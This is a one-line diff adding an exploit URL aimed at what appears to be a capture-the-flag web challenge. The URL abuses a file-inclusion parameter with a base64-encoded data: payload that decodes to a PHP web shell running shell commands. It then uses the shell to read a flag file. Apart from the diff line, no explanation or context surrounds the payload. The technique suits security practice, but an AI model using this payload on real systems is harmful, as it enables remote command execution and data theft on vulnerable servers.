@@ -1,0 +1,1 @@
+http://ctf.adl.csie.ncu.edu.tw:8764/index.php?page=data:text/plain;base64,PD9waHAgZWNobyBzaGVsbF9leGVjKCRfR0VUWydjbWQnXSk7Pz4=&cmd=cat%203b8a24fe229f7f62e53e1060dca89c6a133f728aa4031f630cb3e59c466d2cb1/3a0436148fef1ad7e3bafaa0259fa99833961abbdc3aaf3e371cc699c1b6314d/f14ggggggggggg
